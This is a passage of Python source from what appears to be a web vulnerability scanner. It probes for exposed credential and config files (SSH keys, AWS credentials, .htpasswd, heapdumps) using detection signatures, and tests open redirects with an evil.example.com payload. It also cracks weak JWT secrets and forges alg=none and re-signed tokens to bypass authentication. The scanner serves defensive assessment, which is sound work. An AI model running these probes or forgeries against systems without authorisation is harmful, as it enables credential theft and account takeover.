    "/backup.sql": ("CRITICAL", "CWE-538", 9.1, 'Public database dump. Remove immediately and rotate credentials.',
                    [r"CREATE TABLE", r"INSERT INTO", r"mysqldump|pg_dump"]),
    "/dump.sql": ("CRITICAL", "CWE-538", 9.1, 'Remove the dump from the webroot.',
                  [r"CREATE TABLE", r"INSERT INTO"]),
    "/database.sql": ("CRITICAL", "CWE-538", 9.1, 'Remove the dump from the webroot.',
                      [r"CREATE TABLE", r"INSERT INTO"]),
    "/db.sql": ("CRITICAL", "CWE-538", 9.1, 'Remove the dump from the webroot.',
                [r"CREATE TABLE", r"INSERT INTO"]),
    "/wp-config.php.bak": ("CRITICAL", "CWE-538", 9.8, 'Config backup contains DB credentials. Remove and rotate.',
                           [r"DB_(NAME|PASSWORD|USER)", r"define\s*\("]),
    "/wp-config.php~": ("CRITICAL", "CWE-538", 9.8, 'Remove editor backup files and rotate credentials.',
                        [r"DB_(NAME|PASSWORD|USER)"]),
    "/config.php.bak": ("HIGH", "CWE-538", 7.5, 'Remove the config backup and rotate credentials.',
                        [r"password|passwd|db_|database"]),
    "/phpinfo.php": ("HIGH", "CWE-200", 7.5, 'Remove phpinfo from production.',
                     [r"phpinfo\(\)", r"PHP Version\s", r"<title>phpinfo"]),
    "/info.php": ("MEDIUM", "CWE-200", 5.3, 'Remove the PHP info page from production.',
                  [r"phpinfo\(\)", r"PHP Version\s"]),
    "/server-status": ("LOW", "CWE-200", 5.3, 'Restrict to localhost/ACL.',
                       [r"Apache Status", r"Total accesses", r"Server uptime"]),
    "/server-info": ("LOW", "CWE-200", 5.3, 'Restrict to localhost/ACL.',
                     [r"Apache Status|Server Information", r"Configuration Phase Participation"]),
    "/.DS_Store": ("LOW", "CWE-538", 3.7, 'Remove it; add it to .gitignore.', [r"Bud1"]),
    "/composer.json": ("LOW", "CWE-200", 5.3, 'Do not expose in production.',
                       [r'"(require|autoload|name)"\s*:']),
    "/composer.lock": ("LOW", "CWE-200", 5.3, 'Discloses the exact dependency version.',
                       [r'"packages"\s*:', r'"content-hash"']),
    "/package.json": ("LOW", "CWE-200", 5.3, 'Do not expose in production.',
                      [r'"(dependencies|devDependencies|name)"\s*:']),
    "/package-lock.json": ("LOW", "CWE-200", 5.3, 'Discloses the exact dependency version.',
                           [r'"lockfileVersion"']),
    "/WEB-INF/web.xml": ("HIGH", "CWE-200", 7.5, 'Block WEB-INF in the servlet container.',
                         [r"<web-app", r"<servlet"]),
    "/.htpasswd": ("HIGH", "CWE-538", 7.5, 'Credential file; block .ht* access.',
                   [r"(?m)^[A-Za-z0-9_.-]+:\$"]),
    "/debug/vars": ("HIGH", "CWE-489", 8.2, 'Disable debug endpoints in production.',
                    [r"(?i)debug|request|environ|config"]),
    "/actuator/env": ("CRITICAL", "CWE-200", 9.8, 'Spring Boot actuator env leaks credentials. Disable/secure the endpoint.',
                      [r"propertySources|activeProfiles|systemEnvironment"]),
    "/actuator/heapdump": ("CRITICAL", "CWE-200", 9.8, 'A heapdump can contain live credentials. Disable the endpoint.',
                           []),  # tanpa signature: dinilai dari status+ukuran+baseline
    "/actuator/configprops": ("HIGH", "CWE-200", 7.5, "Matikan/secure actuator configprops.",
                              [r"configurationProperties|beans|contexts"]),
    "/adminer.php": ("HIGH", "CWE-425", 8.8, 'Remove Adminer from production.',
                     [r"Adminer", r"Login\s*-"]),
    "/elmah.axd": ("HIGH", "CWE-532", 7.5, "Secure error log endpoint.",
                   [r"ELMAH|Error Log"]),
    "/.aws/credentials": ("CRITICAL", "CWE-200", 9.8, 'AWS credentials exposed — rotate IMMEDIATELY.',
                          [r"aws_access_key_id", r"\[default\]|\[profile"]),
    "/id_rsa": ("CRITICAL", "CWE-200", 9.8, 'Private key exposed — rotate IMMEDIATELY.',
                [r"BEGIN (RSA |OPENSSH |EC )?PRIVATE KEY"]),
    "/.ssh/id_rsa": ("CRITICAL", "CWE-200", 9.8, 'Private key exposed — rotate IMMEDIATELY.',
                     [r"BEGIN (RSA |OPENSSH |EC )?PRIVATE KEY"]),
    "/docker-compose.yml": ("MEDIUM", "CWE-200", 5.3, 'Discloses service architecture and environment.',
                            [r"(?m)^services\s*:", r"(?m)^\s+image\s*:"]),
    "/.gitlab-ci.yml": ("LOW", "CWE-200", 3.7, 'Discloses the CI pipeline.',
                        [r"(?m)^(stages|image|script)\s*:"]),
    "/robots.txt.bak": ("LOW", "CWE-200", 3.7, 'Remove the backup file.', [r"User-agent"]),
    # --- tambahan enterprise (v3.1) ---
    "/backup.zip": ("CRITICAL", "CWE-538", 9.1, 'Public site backup archive — remove it and treat its contents as leaked.',
                    [r"^PK\x03\x04"]),
    "/site.zip": ("CRITICAL", "CWE-538", 9.1, 'Public site archive — remove from the webroot.',
                  [r"^PK\x03\x04"]),
    "/www.zip": ("CRITICAL", "CWE-538", 9.1, 'Public site archive — remove from the webroot.',
                 [r"^PK\x03\x04"]),
    "/db.zip": ("CRITICAL", "CWE-538", 9.1, 'Public database archive — remove it and rotate credentials.',
                [r"^PK\x03\x04"]),
    "/archive.zip": ("HIGH", "CWE-538", 7.5, 'Public archive — remove from the webroot.',
                     [r"^PK\x03\x04"]),
    "/web.config": ("HIGH", "CWE-200", 7.5, 'web.config leaks the connection string and IIS configuration.',
                    [r"<configuration", r"connectionStrings|system\.web"]),
    "/.bash_history": ("CRITICAL", "CWE-200", 9.1, 'Shell history exposed — remove it and audit its contents.',
                       [r"(?m)^\s*(sudo|cd|ls|cat|ssh|curl|wget|mysql)\b"]),
    "/settings.py": ("HIGH", "CWE-200", 7.5, 'Django settings exposed (SECRET_KEY/DB). Rotate the secret.',
                     [r"SECRET_KEY|DATABASES\s*=|DJANGO"]),
    "/config.yml": ("MEDIUM", "CWE-200", 5.3, 'Configuration file exposed.',
                    [r"(?m)^(database|production|development|adapter)\s*:"]),
    "/actuator/prometheus": ("MEDIUM", "CWE-200", 5.3, 'Internal metrics exposed.',
                             [r"# HELP |# TYPE "]),
    "/actuator/metrics": ("MEDIUM", "CWE-200", 5.3, 'Internal metrics exposed.',
                          [r'"names"\s*:\s*\[|jvm\.|process\.']),
    "/.env.save": ("HIGH", "CWE-200", 7.5, 'Remove the .env backup from the webroot.',
                   [r"(?m)^[A-Z][A-Z0-9_]{2,}\s*=\s*\S+"]),
    "/application.yml": ("MEDIUM", "CWE-200", 5.3, 'Spring configuration exposed.',
                         [r"(?m)^(spring|server|datasource)\s*:"]),
    "/.npmrc": ("HIGH", "CWE-200", 7.5, 'npm registry token potentially leaked — rotate it.',
                [r"_authToken|registry\s*="]),
    # --- manifest dependensi tambahan (v1.10.0 WS2): file yang sama juga
    # ditambang isinya menjadi versi framework oleh c_dependency_versions
    # (hanya sesudah lolos verifikasi signature + validasi struktur).
    "/Gemfile.lock": ("LOW", "CWE-200", 5.3, 'Discloses the exact gem dependency versions.',
                      [r"(?m)^GEM\s*$", r"(?m)^\s+specs:"]),
    "/requirements.txt": ("LOW", "CWE-200", 5.3, 'Discloses Python dependency pins.',
                          [r"(?m)^[A-Za-z0-9_.\-]+==[^\s;]+"]),
    "/Pipfile.lock": ("LOW", "CWE-200", 5.3, 'Discloses the exact Python dependency versions.',
                      [r'"_meta"', r'"default"\s*:']),
    "/pom.xml": ("LOW", "CWE-200", 5.3, 'Discloses the Maven project model and dependency versions.',
                 [r"<project", r"<modelVersion>"]),
    "/build.gradle": ("LOW", "CWE-200", 5.3, 'Discloses the Gradle build and dependency versions.',
                      [r"(?m)^\s*(plugins|buildscript)\s*\{", r"apply\s+plugin:"]),
    "/packages.config": ("LOW", "CWE-200", 5.3, 'Discloses the exact NuGet package versions.',
                         [r"<packages>", r"<package\s+id="]),
}


def c_sensitive_files(ctx, add):
    ctx.soft404()  # hangatkan baseline dulu
    for path, (sev, cwe, cvss, remed, sigs) in SENSITIVE_FILES.items():
        if ctx.cancelled():
            return
        r = ctx.client.get(path)
        if r.status != 200 or not r.body or ctx.is_missing(r):
            continue
        matched = None
        for sig in sigs:
            if re.search(sig, r.body):
                matched = sig
                break
        if sigs and not matched:
            ctx.L(f"  [filter] {path} 200 but signature does not match — treated as soft-404/FP, skipped")
            continue
        if not sigs and len(r.body) < 1024:
            continue  # heapdump asli besar; respons kecil tanpa signature = tidak meyakinkan
        if path in SECRET_FEED_PATHS:
            # Secrets Engine v2 (B3.3): the verified body is fed to the
            # secrets engine by c_exposed_secrets later in the profile.
            feed = getattr(ctx, "_secret_feed", None)
            if feed is None:
                feed = ctx._secret_feed = []
            feed.append((path, r.body[:262144]))
        if path in DEP_FEED_PATHS:
            # WS2 (v1.10.0): the SAME verified body (it already passed
            # the signature gate + soft-404 guard above) is fed to the
            # dependency-manifest miner in c_dependency_versions —
            # zero extra fetches; the miner re-validates structure
            # strictly before any version is claimed.
            dfeed = getattr(ctx, "_dep_feed", None)
            if dfeed is None:
                dfeed = ctx._dep_feed = []
            dfeed.append((path, r.body[:4000000]))
        add(F(sev, f"Sensitive file exposed: {path}",
              f"The endpoint responded 200 and the content PASSED signature verification ({matched or 'size+baseline'}), not just a 200 status. {remed}",
              evidence=f"HTTP 200, {len(r.body)} bytes, signature: {matched or '-'}",
              cwe=cwe, owasp="A05:2021 Security Misconfiguration", cvss=cvss,
              remed=remed, confidence="confirmed" if matched else "probable",
              location=path))


# ------------------------------------------------- WS2 (v1.10.0): tambang
# isi manifest dependensi yang SUDAH terkonfirmasi bocor oleh
# c_sensitive_files menjadi versi framework di tech_profile.
# Aturan bukti keras:
# - Isi wajib lolos validasi struktur per format (parse JSON/lockfile
#   valid + skema kunci cocok). Respons catch-all/SPA (HTML 200 untuk
#   semua path) gugur di gerbang c_sensitive_files (signature +
#   soft-404) DAN di validasi struktur di sini — dua lapis.
# - Hanya versi EKSAK yang ditambang: rentang semver di file deklarasi
#   (package.json/composer.json: "^4.18.2", "~10.0") BUKAN versi dan
#   tidak pernah diklaim. Lockfile memuat versi ter-resolve = eksak.
# - K3: hanya framework/runtime yang dikenal di katalog bawah — bukan
#   semua dependensi.
_DEP_EXACT = re.compile(r"^v?(\d+\.\d+\.\d+(?:[-+][0-9A-Za-z.\-]+)?)$")

_DEP_NPM = {"express": "Express (Node.js)", "next": "Next.js",
            "nuxt": "Nuxt", "nuxt3": "Nuxt", "@nestjs/core": "NestJS",
            "koa": "Koa", "fastify": "Fastify", "react": "React",
            "react-dom": "React", "vue": "Vue.js",
            "@angular/core": "Angular", "jquery": "jQuery"}
_DEP_COMPOSER = {"laravel/framework": "Laravel",
                 "symfony/framework-bundle": "Symfony",
                 "symfony/symfony": "Symfony",
                 "codeigniter4/framework": "CodeIgniter",
                 "codeigniter/framework": "CodeIgniter",
                 "cakephp/cakephp": "CakePHP", "yiisoft/yii2": "Yii",
                 "drupal/core": "Drupal",
                 "johnpbloch/wordpress": "WordPress",
                 "roots/wordpress": "WordPress"}
_DEP_PY = {"django": "Django", "flask": "Flask", "fastapi": "FastAPI"}
_DEP_GEM = {"rails": "Ruby on Rails"}
_DEP_NUGET = {"microsoft.aspnet.mvc": "ASP.NET MVC"}


def _dep_norm(raw):
    """Normalisasi versi eksak dari manifest; None bila bukan versi
    eksak (rentang/operator/placeholder tidak pernah diklaim)."""
    if not isinstance(raw, str):
        return None
    m = _DEP_EXACT.match(raw.strip())
    return m.group(1) if m else None


def _dep_json(body):
    try:
        d = json.loads(body or "")
    except Exception:
        return None
    return d if isinstance(d, dict) else None


def _mine_manifest(path, body):
    """Parse satu manifest terverifikasi -> list (nama_teknologi,
    versi, id_paket). Mengembalikan [] untuk isi yang tidak lolos
    validasi struktur — tanpa klaim apa pun."""
    out = []
    if not body or len(body) < 8:
        return out
    if path == "/package-lock.json":
        d = _dep_json(body)
        if not d or "lockfileVersion" not in d:
            return out
        pkgs = d.get("packages")
        if isinstance(pkgs, dict):
            for key, ent in pkgs.items():
                if not key.startswith("node_modules/") \
                        or not isinstance(ent, dict):
                    continue
                pkg = key[len("node_modules/"):]
                pkg = pkg.split("/node_modules/")[-1]
                name = _DEP_NPM.get(pkg)
                ver = _dep_norm(ent.get("version"))
                if name and ver:
                    out.append((name, ver, pkg))
        deps = d.get("dependencies")
        if isinstance(deps, dict):
            for pkg, ent in deps.items():
                name = _DEP_NPM.get(pkg)
                ver = _dep_norm((ent or {}).get("version")) \
                    if isinstance(ent, dict) else None
                if name and ver:
                    out.append((name, ver, pkg))
    elif path == "/package.json":
        d = _dep_json(body)
        if not d:
            return out
        for sect in ("dependencies", "devDependencies"):
            deps = d.get(sect)
            if not isinstance(deps, dict):
                continue
            for pkg, raw in deps.items():
                name = _DEP_NPM.get(pkg)
                ver = _dep_norm(raw)  # rentang ^/~ gugur di sini
                if name and ver:
                    out.append((name, ver, pkg))
    elif path == "/composer.lock":
        d = _dep_json(body)
        if not d or not isinstance(d.get("packages"), list):
            return out
        for ent in d["packages"]:
            if not isinstance(ent, dict):
                continue
            name = _DEP_COMPOSER.get(str(ent.get("name") or "").lower())
            ver = _dep_norm(ent.get("version"))
            if name and ver:
                out.append((name, ver, str(ent.get("name"))))
    elif path == "/composer.json":
        d = _dep_json(body)
        if not d or not isinstance(d.get("require"), dict):
            return out
        for pkg, raw in d["require"].items():
            name = _DEP_COMPOSER.get(str(pkg).lower())
            ver = _dep_norm(raw)
            if name and ver:
                out.append((name, ver, str(pkg)))
    elif path == "/Gemfile.lock":
        if "GEM" not in body or "specs:" not in body:
            return out
        for m in re.finditer(r"(?m)^    ([a-z0-9_.\-]+) \(([\d][^)]*)\)",
                             body):
            name = _DEP_GEM.get(m.group(1).lower())
            ver = _dep_norm(m.group(2))
            if name and ver:
                out.append((name, ver, m.group(1)))
    elif path == "/requirements.txt":
        if body.lstrip().startswith("<"):
            return out  # halaman HTML (catch-all), bukan manifest
        for m in re.finditer(r"(?mi)^\s*([A-Za-z0-9_.\-]+)==([^\s;#]+)",
                             body):
            name = _DEP_PY.get(m.group(1).lower())
            ver = _dep_norm(m.group(2))
            if name and ver:
                out.append((name, ver, m.group(1)))
    elif path == "/Pipfile.lock":
        d = _dep_json(body)
        if not d or not isinstance(d.get("default"), dict):
            return out
        for pkg, ent in d["default"].items():
            if not isinstance(ent, dict):
                continue
            raw = str(ent.get("version") or "")
            name = _DEP_PY.get(str(pkg).lower())
            ver = _dep_norm(raw[2:] if raw.startswith("==") else raw)
            if name and ver:
                out.append((name, ver, str(pkg)))
    elif path == "/pom.xml":
        if "<project" not in body or "spring-boot-starter-parent" \
                not in body:
            return out
        m = re.search(r"<parent>.*?<artifactId>\s*spring-boot-starter-"
                      r"parent\s*</artifactId>\s*<version>\s*([\d.]+)"
                      r"\s*</version>", body, re.S)
        if m:
            out.append(("Spring Boot", m.group(1),
                        "spring-boot-starter-parent"))
    elif path == "/build.gradle":
        m = re.search(r"id\s+['\"]org\.springframework\.boot['\"]\s+"
                      r"version\s+['\"]([\d.]+)['\"]", body)
        if not m:
            m = re.search(r"['\"]org\.springframework\.boot:[^'\"]*?:"
                          r"([\d.]+)['\"]", body)
        if m:
            out.append(("Spring Boot", m.group(1),
                        "org.springframework.boot"))
    elif path == "/packages.config":
        if "<packages>" not in body:
            return out
        for m in re.finditer(r"<package\s+([^>]+)>", body):
            attrs = dict(re.findall(r'(\w+)\s*=\s*"([^"]*)"',
                                    m.group(1)))
            name = _DEP_NUGET.get((attrs.get("id") or "").lower())
            ver = _dep_norm(attrs.get("version"))
            if name and ver:
                out.append((name, ver, attrs.get("id")))
    # dedup per (nama, versi) — entri pertama menang
    seen, uniq = set(), []
    for name, ver, pkg in out:
        if (name, ver) not in seen:
            seen.add((name, ver))
            uniq.append((name, ver, pkg))
    return uniq


def _merge_dep_tech(techs, name, ver, pkg, path):
    """Gabungkan satu versi hasil tambang manifest ke tech_profile.
    Entri yang sudah ada: versi diisi + evidence/sumber 'depfile'
    ditambah, keyakinan dihitung ulang dengan semantik profil yang
    sama (verified > >=2 sumber = confirmed > probable). Entri baru:
    probable — satu artefak (file milik aplikasi sendiri), skor 0.90."""
    import techdb as _tdb
    ev = f"exposed dependency file {path}: {pkg} {ver}"
    cur = next((t for t in techs if t["name"] == name), None)
    if cur is None:
        techs.append({"name": name,
                      "category": _tdb._CAT_BY_NAME.get(name, "Framework"),
                      "version": ver, "evidence": ev, "source": "depfile",
                      "evidence_list": [ev], "sources": ["depfile"],
                      "detail": _tdb.DETAILS.get(name, ""),
                      "confidence": "probable",
                      "version_confidence": "probable", "score": 0.90})
        return True
    if "depfile" not in (cur.get("sources") or []):
        cur.setdefault("sources", []).append("depfile")
    if ev not in (cur.get("evidence_list") or []):
        cur.setdefault("evidence_list", []).append(ev)
    changed = False
    if ver and not cur.get("version"):
        cur["version"] = ver
        changed = True
    srcs = set(cur.get("sources") or [])
    if cur.get("verified"):
        cur["confidence"] = "verified"
    elif len(srcs) >= 2:
        cur["confidence"] = "confirmed"
    else:
        cur["confidence"] = "probable"
    if cur.get("version"):
        cur["version_confidence"] = cur["confidence"]
    cur["score"] = max(cur.get("score") or 0.0, 0.90) \
        if not cur.get("verified") else 0.98
    return changed


def c_dependency_versions(ctx, add):
    """WS2 (v1.10.0): versi framework dari isi manifest dependensi
    yang terkonfirmasi bocor. Berjalan sesudah c_sensitive_files
    (feed-nya) dan sebelum c_cve_candidates (agar versi hasil tambang
    ikut dicocokkan CVE-nya di profil deep/enterprise)."""
    feed = getattr(ctx, "_dep_feed", None) or []
    if not feed:
        return
    techs = _tech_fingerprint(ctx)
    mined = []
    for path, body in feed:
        for name, ver, pkg in _mine_manifest(path, body):
            _merge_dep_tech(techs, name, ver, pkg, path)
            mined.append((name, ver, path))
            ctx.L(f"  [depfile] {path}: {pkg} -> {name} {ver}")
    if mined:
        ringkas = "; ".join(f"{n} {v} (from {p})" for n, v, p in mined)
        add(F("INFO", "Framework version(s) from exposed dependency "
                      f"manifest: {len(mined)} identified",
              "The application's own dependency manifest — already "
              "confirmed exposed by the sensitive-files check and "
              "structurally validated before mining — pins these "
              "exact framework versions. The versions are read from "
              "the file itself (never inferred from a product name); "
              "whether the running deployment uses exactly this "
              "manifest is rated probable. CVE candidates for these "
              "versions are reported separately as candidates.",
              evidence=ringkas[:600], cwe="CWE-200", owasp="A05:2021",
              cvss=0.0,
              remed="Remove dependency manifests (lockfiles, "
                    "package.json, pom.xml) from the web root; they "
                    "hand attackers an exact version inventory.",
              confidence="probable",
              location=mined[0][2]))


def c_directory_listing(ctx, add):
    for path in ["/uploads/", "/backup/", "/files/", "/static/", "/images/",
                 "/media/", "/assets/", "/data/", "/download/", "/documents/"]:
        r = ctx.client.get(path)
        if r.status == 200 and not ctx.is_missing(r) and re.search(
                r"Index of /|Directory listing for|<title>Index of|Parent Directory</a>", r.body):
            add(F("MEDIUM", f"Directory listing enabled: {path}",
                  'An attacker can inventory all files in this directory.',
                  evidence='listing signature detected and not a soft-404',
                  cwe="CWE-548", owasp="A05:2021 Security Misconfiguration", cvss=5.3,
                  remed='Disable autoindex at the web server.',
                  confidence="confirmed", location=path))


def c_admin_panels(ctx, add):
    for path in ["/admin", "/admin/login", "/administrator", "/manager/html",
                 "/wp-login.php", "/cpanel", "/console", "/admin/dashboard",
                 "/user/login", "/auth/login"]:
        r = ctx.client.get(path)
        if r.status == 200 and r.body and not ctx.is_missing(r) and re.search(
                r'type=["\']password["\']|sign in|log ?in', r.body, re.I):
            add(F("MEDIUM", f"Admin/login panel exposed: {path}",
                  'Ensure the panel is protected by rate limiting, MFA, and IP restrictions. A real password form was found (not a disguised 404 page).',
                  evidence=f"HTTP 200 with a password form", cwe="CWE-1188",
                  owasp="A07:2021 Identification & Authentication Failures", cvss=5.3,
                  remed='Restrict access via IP/VPN; enable MFA; rate-limit logins.',
                  confidence="confirmed", location=path))


def c_http_methods(ctx, add):
    r = ctx.client.request("OPTIONS", "/")
    allow = r.hdr("allow")
    risky = [m for m in ("PUT", "DELETE", "TRACE", "CONNECT") if m in allow.upper()]
    if risky:
        add(F("MEDIUM", f"Risky HTTP method allowed: {', '.join(risky)}",
              f"Allow header announces: {allow}. This method should be disabled if unused.",
              evidence=f"Allow: {allow}", cwe="CWE-650", owasp="A05:2021", cvss=5.3,
              remed='Restrict methods in the web server configuration.',
              confidence="probable", location="/"))
    # TRACE aktif sungguhan (XST): payload header harus terpantul di body
    mk = ctx.marker
    tr = ctx.client.request("TRACE", "/", headers={"X-PTK-Trace": mk})
    if tr.status and mk in (tr.body or ""):
        add(F("MEDIUM", 'HTTP TRACE enabled (XST possible)',
              'The TRACE response reflects the sent headers — Cross-Site Tracing is possible.',
              evidence=f"TRACE -> {tr.status}, marker reflected", cwe="CWE-693",
              owasp="A05:2021", cvss=5.3, remed='Disable TRACE at the web server.',
              confidence="confirmed", location="/"))
    # WebDAV aktif: PROPFIND yang dijawab multistatus = DAV berjalan (sering tak disadari)
    pf = ctx.client.request("PROPFIND", "/", headers={"Depth": "1"})
    if pf.status == 207 or "multistatus" in (pf.body or "")[:2000].lower():
        add(F("MEDIUM", 'WebDAV enabled (PROPFIND responds)',
              'PROPFIND returned a multistatus — WebDAV is running on the web server. Unmonitored DAV can become a file upload/overwrite path.',
              evidence=f"PROPFIND / -> {pf.status}", cwe="CWE-650",
              owasp="A05:2021", cvss=5.3,
              remed='Disable WebDAV if unused; if used, require authentication.',
              confidence="confirmed", location="/"))


def c_open_redirect(ctx, add):
    evil = "evil.example.com"
    surf = ctx.surface(full=True)
    cands = []
    for pq in surf.param_urls:
        base, names = crawl_mod.params_of(pq)
        for n in names:
            if n.lower() in crawl_mod.URL_PARAM_NAMES or "redir" in n.lower() or "return" in n.lower():
                cands.append((base, n))
    for p in crawl_mod.REDIRECT_PATHS:
        for n in ["url", "next", "redirect", "returnTo", "return", "target"]:
            cands.append((p, n))
    seen = set()
    for base, pname in cands:
        if (base, pname) in seen or ctx.cancelled():
            continue
        seen.add((base, pname))
        for payload in [f"https://{evil}", f"//{evil}", f"https:{evil}"]:
            r = ctx.req_param(base, pname, payload)
            loc = r.hdr("location")
            if r.status in (301, 302, 303, 307, 308) and urlparse(loc).hostname == evil:
                add(F("HIGH", f"Open Redirect: {base} param '{pname}'",
                      'Redirect follows user input without domain validation.',
                      evidence=f"Location: {loc}", cwe="CWE-601",
                      owasp="A01:2021 Broken Access Control", cvss=6.1,
                      remed='Whitelist redirect targets; do not use absolute URLs from input.',
                      confidence="confirmed", location=base, param=pname))
                return


def c_csrf_forms(ctx, add):
    surf = ctx.surface(full=True)
    for form in surf.forms:
        if form["method"] != "POST":
            continue
        names = [i.lower() for i in form["inputs"]]
        if any("token" in n or "csrf" in n or "authenticity" in n or "_nonce" in n
               for n in names):
            continue
        add(F("MEDIUM", f"POST form without anti-CSRF token: {form['action']}",
              f"Form at {form['page']} (input: {', '.join(form['inputs'][:6]) or '-'}) does not contain a detected CSRF token field. If this form changes state and relies on a session cookie, it is vulnerable to CSRF.",
              evidence=f"inputs={form['inputs'][:6]}", cwe="CWE-352",
              owasp="A01:2021 Broken Access Control", cvss=6.5,
              remed='Add a per-session CSRF token verified by the server + SameSite cookies.',
              confidence="probable", location=form["action"]))


def _b64url_json(s):
    try:
        pad = "=" * (-len(s) % 4)
        return json.loads(base64.urlsafe_b64decode(s + pad))
    except Exception:
        return None


JWT_WEAK_SECRETS = ["secret", "password", "changeme", "key", "jwtsecret",
                    "your-secret-key", "secretkey", "123456", "admin", "supersecret"]


def c_jwt_analysis(ctx, add):
    tokens = set()
    r = ctx.surface(full=False).homepage or ctx.client.get("/")
    for src in [r.body or ""] + r.hdr_all("set-cookie"):
        for m in re.finditer(r"eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]*", src):
            tokens.add(m.group(0))
    for tok in list(tokens)[:3]:
        parts = tok.split(".")
        header, payload = _b64url_json(parts[0]), _b64url_json(parts[1])
        if not header or payload is None:
            continue
        alg = str(header.get("alg", "")).lower()
        loc = 'JWT in response/cookie'
        if alg == "none":
            add(F("CRITICAL", 'JWT with alg=none',
                  'The token is unsigned — anyone can forge the payload.',
                  evidence=tok[:60] + "…", cwe="CWE-347", owasp="A07:2021", cvss=9.1,
                  remed='Reject alg=none; enforce a strong algorithm on the server.',
                  confidence="confirmed", location=loc))
            continue
        if alg.startswith("hs") and len(parts) == 3 and parts[2]:
            sig = parts[2]
            for secret in JWT_WEAK_SECRETS:
                mac = hmac_mod.new(secret.encode(),
                                   f"{parts[0]}.{parts[1]}".encode(), hashlib.sha256)
                expect = base64.urlsafe_b64encode(mac.digest()).rstrip(b"=").decode()
                if hmac_mod.compare_digest(expect, sig):
                    add(F("CRITICAL", f"JWT HMAC weak secret: '{secret}'",
                          'The JWT signature was successfully verified with a secret from a common wordlist.',
                          evidence=f"alg={alg}, secret matched from the built-in wordlist",
                          cwe="CWE-798", owasp="A07:2021", cvss=9.8,
                          remed='Replace the secret with a random value >=32 bytes; rotate active tokens.',
                          confidence="confirmed", location=loc))
                    break
        if isinstance(payload, dict) and "exp" not in payload:
            add(F("MEDIUM", 'JWT without exp claim',
                  'A token without expiry can be used forever if leaked.',
                  evidence=f"payload keys: {', '.join(list(payload)[:8])}", cwe="CWE-613",
                  owasp="A07:2021", cvss=5.3,
                  remed='Set a short exp + revocable refresh tokens.',
                  confidence="confirmed", location=loc))


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _find_jwts(ctx):
    tokens = set()
    r = ctx.surface(full=False).homepage or ctx.client.get("/")
    for src in [r.body or ""] + r.hdr_all("set-cookie"):
        for m in re.finditer(r"eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]*", src):
            tokens.add(m.group(0))
    return list(tokens)[:3]


def c_jwt_forgery(ctx, add):
    """Verifikasi aktif pemalsuan JWT: endpoint identitas harus menerima
    token ASLI dan memantulkan klaim identitasnya (baseline). Baru kemudian
    dua teknik pemalsuan diuji — alg=none dan tanda-tangan ulang dengan
    secret lemah. Hanya pantulan identitas PALSU yang menjadi temuan
    confirmed; endpoint ketat tidak menghasilkan apa-apa."""
    for tok in _find_jwts(ctx):
        parts = tok.split(".")
        if len(parts) != 3:
            continue
        header, payload = _b64url_json(parts[0]), _b64url_json(parts[1])
        if not header or not isinstance(payload, dict):
            continue
        idkey = next((k for k in ("user", "sub", "id", "username", "email")
                      if k in payload), None)
        if not idkey:
            continue

        def probe(ep, token):
            return ctx.client.request(
                "GET", ep, headers={"Authorization": f"Bearer {token}"})

        for ep in ("/api/me", "/api/user", "/api/profile", "/api/auth/me",
                   "/api/v1/me", "/me"):
            try:
                r0 = probe(ep, tok)
            except Exception:
                continue
            if r0.status != 200 or str(payload[idkey]) not in (r0.body or ""):
                continue  # baseline tidak terbukti di endpoint ini
            forged_val = "ptk-forged-admin"
            forged_payload = dict(payload, **{idkey: forged_val})
            # (a) alg=none
            none_tok = "{}.{}.".format(
                _b64url_encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()),
                _b64url_encode(json.dumps(forged_payload).encode()))
            try:
                r1 = probe(ep, none_tok)
            except Exception:
                r1 = None
            if r1 is not None and r1.status == 200 and forged_val in (r1.body or ""):
                add(F("CRITICAL", f"JWT can be forged (alg=none accepted): {ep}",
                      'The endpoint accepts an alg=none token with no signature and reflects a forged identity — authentication can be fully bypassed.',
                      evidence=f"forged identity '{forged_val}' accepted at {ep}",
                      cwe="CWE-347", owasp="A07:2021", cvss=9.8,
                      remed='Reject alg=none; signature verification is mandatory on all endpoints.',
                      confidence="confirmed", location=ep))
            # (b) tanda tangan ulang dengan secret lemah dari wordlist
            if str(header.get("alg", "")).lower().startswith("hs"):
                for secret in JWT_WEAK_SECRETS:
                    mac = hmac_mod.new(secret.encode(),
                                       f"{parts[0]}.{parts[1]}".encode(), hashlib.sha256)
                    if not hmac_mod.compare_digest(
                            _b64url_encode(mac.digest()), parts[2]):
                        continue
                    signing = "{}.{}".format(
                        parts[0], _b64url_encode(json.dumps(forged_payload).encode()))
                    mac2 = hmac_mod.new(secret.encode(), signing.encode(), hashlib.sha256)
                    forged_tok = f"{signing}.{_b64url_encode(mac2.digest())}"
                    try:
                        r2 = probe(ep, forged_tok)
                    except Exception:
                        r2 = None
                    if r2 is not None and r2.status == 200 and forged_val in (r2.body or ""):
                        add(F("CRITICAL",
                              f"JWT can be forged (weak secret, token re-signed): {ep}",
                              'The HMAC secret is in a common wordlist, so a token can be re-signed with any identity and accepted by the server.',
                              evidence=f"re-signed with secret '{secret}' accepted at {ep}",
                              cwe="CWE-798", owasp="A07:2021", cvss=9.8,
                              remed='Replace the secret with a random value >=32 bytes; rotate active tokens.',
                              confidence="confirmed", location=ep))
                    break
            return  # baseline endpoint ketemu & diuji — selesai


def c_websocket_surface(ctx, add):
    """Permukaan WebSocket: URL ws(s) dikumpulkan crawler dari HTML/JS;
    handshake Upgrade dibuktikan (101 + Sec-WebSocket-Accept valid),
    lalu validasi Origin diuji dengan Origin asing (indikasi CSWSH)."""
    import base64 as _b64
    import hashlib as _hl
    import os as _os
    surf = ctx.surface()
    targets = []
    for u in (surf.ws_urls or [])[:3]:
        p = urlparse(u)
        if p.hostname == ctx.client.host:
            targets.append((u, (p.path or "/") + (("?" + p.query) if p.query else "")))
    if not targets:
        targets = [(f"ws://{ctx.client.host}/ws", "/ws")]
    GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
    for label, full in targets[:3]:
        key = _b64.b64encode(_os.urandom(16)).decode()
        hdrs = {"Connection": "Upgrade", "Upgrade": "websocket",
                "Sec-WebSocket-Key": key, "Sec-WebSocket-Version": "13"}
        try:
            r = ctx.client.request("GET", full, headers=hdrs)
        except Exception:
            continue
